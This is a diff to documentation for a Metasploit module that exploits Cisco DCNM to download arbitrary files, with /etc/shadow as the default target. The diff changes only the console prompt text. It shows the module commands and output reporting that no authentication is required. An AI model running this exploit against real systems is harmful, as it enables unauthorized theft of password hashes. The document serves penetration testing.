@@ -21,11 +21,11 @@ work on a few versions below 10.4(2). Only version 11.0(1) requires authenticati
 Setup RHOST, pick the file to download (FILENAME, default is /etc/shadow) and enjoy!
 
 ```
-msf5 exploit > use auxiliary/admin/networking/cisco_dcnm_download
+msf exploit > use auxiliary/admin/networking/cisco_dcnm_download
 
-msf5 auxiliary(admin/networking/cisco_dcnm_download) > set rhost 10.75.1.40
+msf auxiliary(admin/networking/cisco_dcnm_download) > set rhost 10.75.1.40
 rhost => 10.75.1.40
-msf5 auxiliary(admin/networking/cisco_dcnm_download) > run
+msf auxiliary(admin/networking/cisco_dcnm_download) > run
 
 [+] 10.75.1.40:443 - Detected DCNM 10.4(2)
 [*] 10.75.1.40:443 - No authentication required, ready to exploit!
